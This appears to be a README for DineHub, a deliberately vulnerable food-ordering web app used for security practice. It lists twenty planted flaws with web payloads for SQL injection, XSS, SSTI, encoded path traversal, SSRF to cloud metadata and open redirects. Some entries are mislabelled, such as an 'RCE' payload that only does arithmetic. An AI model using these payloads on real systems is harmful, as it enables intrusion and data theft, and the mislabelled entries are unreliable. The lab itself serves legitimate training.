# 🍔 DineHub – Vulnerable Food Ordering Platform

* **Author:** Rayan Al-Assiri
* **Difficulty:** Medium
* **Created:** 2025-09-30

---

## Synopsis

**DineHub** is a deliberately vulnerable online food ordering platform designed to simulate real-world web vulnerabilities with realistic protections and bypass requirements.  
The platform allows users to register, browse restaurants, place orders, leave reviews, and manage payments. Each vulnerability is intentionally implemented with partial security controls, requiring bypass techniques such as encoding tricks, payload manipulation, and chaining to exploit successfully.

The application mimics a production-grade SaaS product and supports manual penetration testing, vulnerability research, and automated scanning. Attackers must exploit vulnerabilities in a realistic multi-step chain — starting with authentication bypass and culminating in internal network access.

---

## Quick Solution

> **Purpose:** A compact, human-readable manifest for fast validation.

| # | Vulnerability       | Affected Path                                | PoC                                      |
|---|---------------------|----------------------------------------------|------------------------------------------|
| 1 | SQLi (Auth Bypass)  | *POST* `/auth/login` (username parameter)     | `username=admin' || '1'='1--+`           |
| 2 | SQLi (Data Dump)    | *GET* `/restaurants?filter=`                  | `filter=1 OR 2>1`                        |
| 3 | Reflected XSS       | *GET* `/search` (q parameter)                 | `/search?q=<math href=javascript:alert(1)>` |
| 4 | Stored XSS          | *POST* `/review/add`                          | `<iframe srcdoc="<script>fetch('/cookie')</script>"></iframe>` |
| 5 | SSTI (Template Eval)| *POST* `/admin/announcement`                 | `{{ ''.join(['__cla','ss__']) }}`       |
| 6 | SSTI (RCE)          | *POST* `/admin/offer`                        | `{{ (7).__pow__(2) }}`                   |
| 7 | IDOR (View Order)   | *GET* `/order?id=4a7d1ed414474e4033ac29ccb8653d9b` | Access another user's order data |
| 8 | IDOR (Delete Order) | *POST* `/order/delete`                        | `orderId=00000000-0000-0000-0000-000000000002` |
| 9 | Path Traversal      | *GET* `/receipt/download?file=`               | `file=..%252F..%252F..%252Fetc%252Fpasswd` |
| 10 | Path Traversal (Source Leak) | *GET* `/admin/logs?path=`         | `path=....//....//etc//passwd`          |
| 11 | Sensitive Data Exposure | *GET* `/api/debug`                      | `GET /api/debug?invoice=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` |
| 12 | Sensitive Data Exposure | *GET* `/admin/config`                  | Retrieve exposed API key from config    |
| 13 | SSRF (Localhost)   | *GET* `/fetch/logo?url=`                      | `url=http://0x7f000001:8080`             |
| 14 | SSRF (Metadata)    | *GET* `/admin/fetch_report?url=`             | `url=http://2130706433/latest/meta-data/` |
| 15 | XXE (Local File)   | *POST* `/import/xml`                         | Malicious XML entity read local files   |
| 16 | XXE (Chained Entity)| *POST* `/admin/import`                      | Internal entity chaining to exfiltrate data |
| 17 | Open Redirect      | *GET* `/redirect?next=`                       | `/redirect?next=%2F%2Fevil.com`         |
| 18 | Open Redirect (Admin) | *GET* `/admin/redirect?to=`              | `/admin/redirect?to=https:evil.com`     |
| 19 | Vulnerable Component | Flask <=0.11                              | Trigger known RCE vulnerability         |
| 20 | Vulnerable Component | Requests <=2.18.0                         | SSRF via HTTP request handling          |

---

## Vulnerabilities (Detailed)

### 1. SQL Injection – Authentication Bypass
**Summary:** The login endpoint concatenates user input directly into a SQL query, allowing attackers to bypass authentication.  
**Steps to Reproduce:**
1. Navigate to `/auth/login`
2. Enter payload: `admin' || '1'='1--+`
3. Gain authenticated session
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 2. SQL Injection – Data Exfiltration
**Summary:** The restaurant filter query is vulnerable to SQL injection via the `filter` parameter.  
**Steps to Reproduce:**
1. Send request to `/restaurants?filter=1 OR 2>1`
2. Extract all restaurant data
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 3. Reflected XSS – Search Page
**Summary:** The search feature does not sanitize input properly, allowing script injection.  
**Steps to Reproduce:**
1. Visit `/search?q=<math href=javascript:alert(1)>`
2. Observe JavaScript execution
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 4. Stored XSS – Review System
**Summary:** Review inputs are not properly sanitized, enabling persistent XSS.  
**Steps to Reproduce:**
1. Submit review payload `<iframe srcdoc="<script>fetch('/cookie')</script>"></iframe>`
2. Visit the review page and capture sensitive data
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 5. SSTI – Template Evaluation
**Summary:** Template rendering uses unsanitized user input, enabling code execution.  
**Steps to Reproduce:**
1. Submit payload: `{{ ''.join(['__cla','ss__']) }}`
2. Observe backend code execution
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 6. SSTI – Remote Code Execution
**Summary:** Exploit the template rendering engine to achieve remote code execution.  
**Steps to Reproduce:**
1. Submit payload: `{{ (7).__pow__(2) }}`
2. Achieve code execution on the server
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 7. IDOR – View Another User's Order
**Summary:** The order endpoint lacks proper authorization checks.  
**Steps to Reproduce:**
1. Send GET request to `/order?id=4a7d1ed414474e4033ac29ccb8653d9b`
2. Access another user's order information
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 8. IDOR – Delete Another User's Order
**Summary:** The delete endpoint does not validate user permissions.  
**Steps to Reproduce:**
1. POST to `/order/delete` with `orderId=00000000-0000-0000-0000-000000000002`
2. Delete another user's order
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 9. Path Traversal – Sensitive File Access
**Summary:** File path sanitization is insufficient, enabling traversal attacks.  
**Steps to Reproduce:**
1. Request `/receipt/download?file=..%252F..%252F..%252Fetc%252Fpasswd`
2. Read sensitive system files
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 10. Path Traversal – Source Code Disclosure
**Summary:** Logs endpoint allows directory traversal to access source code.  
**Steps to Reproduce:**
1. Request `/admin/logs?path=....//....//etc//passwd`
2. Retrieve source code or config files
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 11. Sensitive Data Exposure – Debug Endpoint
**Summary:** Excessive debug information is returned, including sensitive keys.  
**Steps to Reproduce:**
1. Request `/api/debug?invoice=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
2. Extract sensitive keys from error output
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 12. Sensitive Data Exposure – Admin Config
**Summary:** Admin configuration endpoint exposes API keys.  
**Steps to Reproduce:**
1. Access `/admin/config`
2. Retrieve sensitive information
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 13. SSRF – Localhost Access
**Summary:** Logo fetcher allows SSRF to internal services.  
**Steps to Reproduce:**
1. Request `/fetch/logo?url=http://0x7f000001:8080`
2. Access localhost services
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 14. SSRF – Metadata Service Access
**Summary:** SSRF vulnerability allows access to cloud metadata.  
**Steps to Reproduce:**
1. Request `/admin/fetch_report?url=http://2130706433/latest/meta-data/`
2. Access internal metadata
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 15. XXE – Local File Disclosure
**Summary:** XML parsing is insecure, allowing local file reads.  
**Steps to Reproduce:**
1. Submit malicious XML with parameter entity expansion
2. Read `/etc/passwd`
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 16. XXE – Chained Entity Exfiltration
**Summary:** Internal entity chaining allows sensitive data exfiltration.  
**Steps to Reproduce:**
1. Submit crafted XML with chained entities
2. Extract sensitive information
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 17. Open Redirect – User Phishing
**Summary:** Redirect endpoint fails to validate URLs properly.  
**Steps to Reproduce:**
1. Visit `/redirect?next=%2F%2Fevil.com`
2. Redirect user to a malicious domain
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 18. Open Redirect – Admin Redirect Abuse
**Summary:** Admin redirect parameter is not sanitized.  
**Steps to Reproduce:**
1. Visit `/admin/redirect?to=https:evil.com`
2. Redirect admin session to attacker site
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 19. Vulnerable Component – Flask
**Summary:** The application uses an outdated version of Flask with a known RCE vulnerability.  
**Steps to Reproduce:**
1. Scan dependencies and find Flask <=0.11
2. Trigger known exploit
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 20. Vulnerable Component – Requests
**Summary:** The application uses a vulnerable version of the Requests library that allows SSRF.  
**Steps to Reproduce:**
1. Scan dependencies and find Requests <=2.18.0
2. Trigger known SSRF exploit
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

## Build / Run Instructions

Provide reproducible steps to run the app locally, and mention any inputs/commands required:

```bash
# run the build-docker.sh file
./build-docker.sh
```
